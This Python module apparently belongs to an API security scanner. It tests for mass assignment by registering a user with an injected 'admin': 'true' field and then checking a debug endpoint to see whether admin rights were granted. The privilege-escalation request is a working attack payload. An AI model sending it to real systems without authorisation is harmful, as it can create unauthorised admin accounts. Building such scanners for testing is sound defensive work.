#!/usr/bin/env python3
"""
Mass Assignment Vulnerability Scanner
Checks if an API endpoint is vulnerable to mass assignment attacks
by attempting to set privileged attributes during object creation.
"""

import requests
from typing import Dict, List, Optional
from .base_scanner import BaseScanner
from RAGScripts.utils.logger import setup_scanner_logger

class MassAssignmentScanner(BaseScanner):
    def __init__(self):
        super().__init__()
        self.logger = setup_scanner_logger("mass_assignment")
        
    def scan(self, url: str, method: str, token: Optional[str] = None, headers: Optional[Dict] = None) -> List[Dict]:
        vulnerabilities = []
        
        # Test registration with admin privileges
        test_payload = {
            "username": "test_mass_" + str(int(self.time.time())),
            "password": "test1",
            "email": "test_mass_" + str(int(self.time.time())) + "@dom.com",
            "admin": "true"
        }
        
        try:
            # Attempt registration with admin privileges
            register_url = f"{url}/users/v1/register"
            register_resp = requests.post(
                register_url,
                json=test_payload,
                timeout=5
            )
            
            if register_resp.status_code == 200:
                # Check if admin privileges were granted
                debug_url = f"{url}/users/v1/_debug"
                debug_resp = requests.get(debug_url, timeout=5)
                
                if debug_resp.status_code == 200:
                    users = debug_resp.json().get("users", [])
                    for user in users:
                        if user.get("username") == test_payload["username"] and user.get("admin") == True:
                            vulnerabilities.append({
                                "type": "MASS_ASSIGNMENT",
                                "severity": "HIGH",
                                "detail": "Successfully created admin user through mass assignment",
                                "evidence": {
                                    "url": register_url,
                                    "payload": test_payload,
                                    "response": debug_resp.json()
                                }
                            })
                            break
                            
        except requests.RequestException as e:
            self.logger.error(f"Error in mass assignment check: {str(e)}")
            
        return vulnerabilities

# Keep the scan function for backward compatibility
scan = MassAssignmentScanner().scan
